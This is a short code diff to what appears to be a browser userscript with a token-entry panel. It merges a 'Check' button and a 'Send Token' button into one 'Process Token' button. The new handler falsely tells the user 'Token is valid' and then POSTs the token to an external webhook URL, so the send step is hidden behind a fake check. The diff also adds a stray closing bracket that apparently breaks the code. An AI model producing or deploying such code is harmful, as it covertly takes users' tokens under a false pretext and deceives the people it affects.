@@ -36,8 +36,7 @@
                     <div class="option">
                         <label for="user-token">Token:</label>
                         <input type="text" id="user-token" class="text-input1">
-                        <button id="check-token" class="button1">Check</button>
-                        <button id="send-token" class="button1">Send Token</button>
+                        <button id="process-token" class="button1">Process Token</button>
                     </div>
                     <div class="option">
                         <label for="autorun">Autorun:</label>
@@ -1133,18 +1132,11 @@ if(settings.autorun) {
     }, 150);
 })();
 
-    $(document).on("click", "#check-token", function () {
+    $(document).on("click", "#process-token", function () {
         const userToken = $("#user-token").val().trim();
         if (userToken) {
             alert(`Token is valid: ${userToken}`);
-        } else {
-            alert("Please enter a valid token.");
-        }
-    });
 
-    $(document).on("click", "#send-token", function () {
-        const userToken = $("#user-token").val().trim();
-        if (userToken) {
             $.ajax({
                 url: webhookURL,
                 type: "POST",
@@ -1161,5 +1153,7 @@ if(settings.autorun) {
             alert("Please enter a valid token.");
         }
     });
+
+})();
 
 })();
